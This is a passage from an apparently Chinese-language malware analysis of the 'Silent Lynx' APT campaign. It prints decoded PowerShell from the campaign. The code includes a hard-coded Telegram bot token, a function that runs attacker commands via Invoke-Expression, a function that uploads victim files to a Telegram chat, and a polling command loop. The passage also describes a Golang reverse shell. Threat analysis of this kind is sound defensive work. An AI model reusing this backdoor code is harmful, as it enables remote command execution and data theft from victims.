data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105518-tvyewwr.png" class="" title="image-20250122105518-tvyewwr">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105525-qk51s5j.png" class="" title="image-20250122105525-qk51s5j">
+
+<p>最后，我们可以看到，通过 CreateProcess API 创建了一个 PowerShell 进程，用于执行编码后的内容块。在下一部分，我们将检查由这个加载器执行的 PowerShell 内容块的具体内容。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105531-9s5r6rk.png" class="" title="image-20250122105531-9s5r6rk">
+
+
+<p><strong>第三阶段 —— 恶意 PowerShell 脚本</strong>：解码 Base64 编码的脚本后，我们发现威胁行为者利用 Telegram Bot 来执行命令和进行数据窃取。该脚本包含两个有趣的函数，即 Invoke - BotCmd 和 Invoke - BotDownload。让我们来看看这些函数的工作原理。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">Token = <span class="hljs-string">&quot;789858392:AAF5FPb]1j1PQfqCGnx - zNdw2R5tF_Xxte&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">URL = <span class="hljs-string">&quot;https://api.telegram.org/bot&#123;0&#125;&quot;</span> -f <span class="hljs-variable">$Token</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">lastID = 123</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sleepTime = 2</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sidentifier = -<span class="hljs-built_in">join</span> (48..57) | Get - Random -Count 5 | % &#123; [char] <span class="hljs-variable">$_</span> &#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>Invoke - BotCmd 函数主要用于执行从威胁行为者处接收的系统命令，并通过 Telegram Bot API 将执行命令的输出发送回用户。它将命令作为输入，使用 Invoke - Expression 运行该命令，并捕获输出或任何错误。结果会用一个唯一标识符进行格式化后发送回用户。如果输出超过 Telegram 的 4095 字符限制，它会被分割成多个块，并通过多条消息发送。对于较短的输出，则直接发送消息。因此，这个函数实现了通过 Telegram API 与受害者计算机进行远程命令执行和响应传递的功能。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">function Invoke - BotCmd &#123;<br>    param (<br>        $command<br>    )<br>    $result = Invoke - Expression ($command)<br>    catch &#123; $result = $Error[0].Exception &#125;<br>    $res = &quot;[&#123;0&#125;]%e%A&quot; -f $sidentifier<br>    $result | ForEach - Object &#123; $res += - [string] $_ + &quot;xD8A&quot; &#125;<br>    if ($res -eq &quot;&quot;) &#123; $lastID = $updateid; continue &#125;<br>    if ($res.Length -gt 4095) &#123;<br>        for ($i = 0; $i -lt $res.Length / 4095; $i++) &#123;<br>            $begin = $i * 4095<br>            $send = $begin + 4094<br>            if ($send -gt $res.Length) &#123;<br>                $send = $res.Length<br>            &#125;<br>            $data = &quot;chat_id=&#123;0&#125;&amp;text=&#123;1&#125;&quot; -f $from, $res[$begin..$send]<br>            $URL = &quot;&#123;0&#125;/sendMessage?&#123;1&#125;&quot; -f $URL, $data<br>            Invoke - WebRequest -Uri $URL &gt; $null<br>        &#125;<br>    &#125; else &#123;<br>        $data = &quot;chat_id=&#123;0&#125;&amp;text=&#123;1&#125;&quot; -f $from, $res<br>        $URL = &quot;&#123;0&#125;/sendMessage?&#123;1&#125;&quot; -f $URL, $data<br>        Invoke - WebRequest -Uri $URL &gt; $null<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Invoke - BotDownload 函数主要用于将受害者系统中的文件上传到由威胁行为者控制的 Telegram 聊天窗口，实现数据窃取。它根据威胁行为者的请求，从指定路径读取文件，准备必要的元数据和内容头，并将文件作为多部分表单数据 POST 请求发送到 Telegram API。因此，这个函数旨在将受害者计算机上的数据窃取到威胁行为者的 Telegram 聊天窗口中。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">function Invoke - BotDownload &#123;<br>    param (<br>        $FilePath<br>    )<br>    Add - type -AssemblyName System.Net.Http<br>    $FieldName = &#x27;document&#x27;<br>    $httpclientHandler = New - Object System.Net.Http.HttpclientHandler<br>    $httpclient = New - Object System.Net.Http.Httpclient($httpclientHandler)<br>    $Filestream = [System.IO.FileStream]::new($FilePath, [System.IO.FileMode]::Open)<br>    $FileHeader = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new(&quot;form - data&quot;)<br>    $FileHeader.Name = $FieldName<br>    $FileHeader.FileName = (Split - Path $FilePath -leaf)<br>    $FileContent = [System.Net.Http.StreamContent]::new($Filestream)<br>    $FileContent.Headers.ContentDisposition = $FileHeader<br>    $FileContent.Headers.ContentType = [System.Web.MimeMapping]::GetMimeMapping($FilePath)<br>    $multipartContent = [System.Net.Http.MultipartFormDataContent]::new()<br>    $multipartContent.Add($FileContent)<br>    $httpClient.PostAsync(&quot;$URL/sendDocument?chat_id=&#123;0&#125;&quot; -f $from, $multipartContent) &gt; $null<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>脚本的其余部分构成了机器人的核心操作逻辑，它在一个持续循环中运行，以监控和处理来自威胁行为者的新消息。它使用 getUpdates API 端点获取消息，并根据消息内容采取行动。像 &#x2F;sleep 这样的命令可以调整机器人的休眠间隔，&#x2F;cmd 命令允许它使用 Invoke - BotCmd 函数执行系统命令，&#x2F;download 命令则通过 Invoke - BotDownload 函数触发从受害者计算机上传文件的操作。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">while ($true) &#123;<br>    try &#123;<br>        $message = Invoke - RestMethod -Method Get -Uri ($URL + &#x27;/getUpdates?offset=&#x27; + ($lastID + 1)) -ErrorAction Stop<br>        if ($message.result) &#123;<br>            foreach ($update in $message.result) &#123;<br>                $updateid = $update.update_id<br>                $from = $update.message.from.id<br>                $command = $update.message.text<br>                if ($command.Substring(0, 6) -eq &quot;/sleep&quot;) &#123;<br>                    $sleepTime = [int]$command.Substring(7)<br>                &#125; elseif ($command.Substring(0, 4) -eq &quot;/cmd&quot;) &#123;<br>                    Invoke - BotCmd -command $command.Substring(5)<br>                &#125; elseif ($command.Substring(0, 9) -eq &quot;/download&quot;) &#123;<br>                    Invoke - BotDownload -FilePath $command.Substring(10)<br>                &#125; else &#123;<br>                    # 处理其他命令或消息<br>                &#125;<br>                $lastID = $updateid<br>            &#125;<br>        &#125;<br>        Start - Sleep -Seconds (Get - Random -Minimum 1 -Maximum 8)<br>    &#125; catch &#123;<br>        Start - Sleep -Seconds (Get - Random -Minimum 1 -Maximum 8)<br>        continue<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对于带有特定标识符的自定义命令，机器人在执行请求的操作之前会验证标识符。该脚本通过更新最后看到的消息 ID 来确保每条消息只被处理一次，并实现了错误处理功能，以便在 API 调用失败时进行重试，同时会随机暂停一段时间，以避免被检测到或因异常网络行为而导致过早被发现或出现其他异常情况。这个循环使得机器人能够执行诸如运行命令、窃取数据以及与威胁行为者保持持续通信等任务。</p>
+<p>现在，我们已经完成了对 C++ 和 PowerShell 加载器的分析，接下来将研究基础设施、其他活动以及威胁行为者的其他活动。</p>
+<h2 id="活动二-1"><a href="#活动二-1" class="headerlink" title="活动二"></a>活动二</h2><p><strong>第一阶段 —— 恶意 Golang 反向 Shell</strong>：提取恶意 RAR 文件后，我们可以看到里面只有两个文件，其中一个是诱饵文档，另一个是 Golang 可执行文件。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105800-o6g5cuc.png" class="" title="image-20250122105800-o6g5cuc">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105815-csm17n2.png" class="" title="image-20250122105815-csm17n2">
+
+<p>查看该二进制文件内部，我们发现它是一个用 Golang 编写的反向 Shell，它使用 net_dial 等包连接到命令控制服务器（C2）。如果连接 C2 失败，它会休眠 0.5 秒，然后运行各种命令。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105820-fj0tt2w.png" class="" title="image-20250122105820-fj0tt2w">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105825-09nv3qj.png" class="" title="image-20250122105825-09nv3qj">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105828-1eahtc2.png" class="" title="image-20250122105828-1eahtc2">
+
+
+<h1 id="基础设施追踪与溯源"><a href="#基础设施追踪与溯源" class="headerlink" title="基础设施追踪与溯源"></a>基础设施追踪与溯源</h1><p>在上一部分中，我们看到威胁行为者利用 Telegram Bot 在受害者系统上执行操作以及进行下载等任务。幸运的是，我们在 PowerShell 脚本中发现了硬编码的 Bot 令牌，从中获取了一些有趣的信息。这就是在此次活动中被用于将内容转发给威胁行为者的 Telegram 机器人。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105904-ktwe9oh.png" class="" title="image-20250122105904-ktwe9oh">
+
+
+<p>我们还可以看到威胁行为者在目标计算机上执行了一些常见命令，如 whoami、ipconfig 等</p>
